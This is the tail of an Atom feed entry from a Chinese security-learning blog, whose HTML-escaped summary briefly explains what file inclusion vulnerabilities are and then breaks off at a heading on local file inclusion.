    <summary type="html">&lt;h2 id=&quot;什么是文件包含&quot;&gt;&lt;a href=&quot;#什么是文件包含&quot; class=&quot;headerlink&quot; title=&quot;什么是文件包含&quot;&gt;&lt;/a&gt;什么是文件包含&lt;/h2&gt;&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;文件包含这个漏洞，简单来说既是程序猿在开发中为了方便，会将在多个页面重复使用的代码单独写到一个文件中，在需要用到的地方直接包含进来，包含后的文件既相当于将被包含的整个文件内容复制到了包含处。因为在开发中是经常用到的，因此成为了攻击者的目标，便衍生了多种文件包含的攻击。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;本地文件包含&quot;&gt;&lt;a href=&quot;#本地文件包含&quot; class=&quot;headerlink&quot; title=&quot;本地文件包含&quot;&gt;&lt;/a&gt;本地文件包含&lt;/h2&gt;&lt;hr&gt;</summary>
    
    
    
    <category term="学习文章" scheme="http://www.secice.cn/categories/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/"/>
    
    
    <category term="文件包含" scheme="http://www.secice.cn/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
</feed>
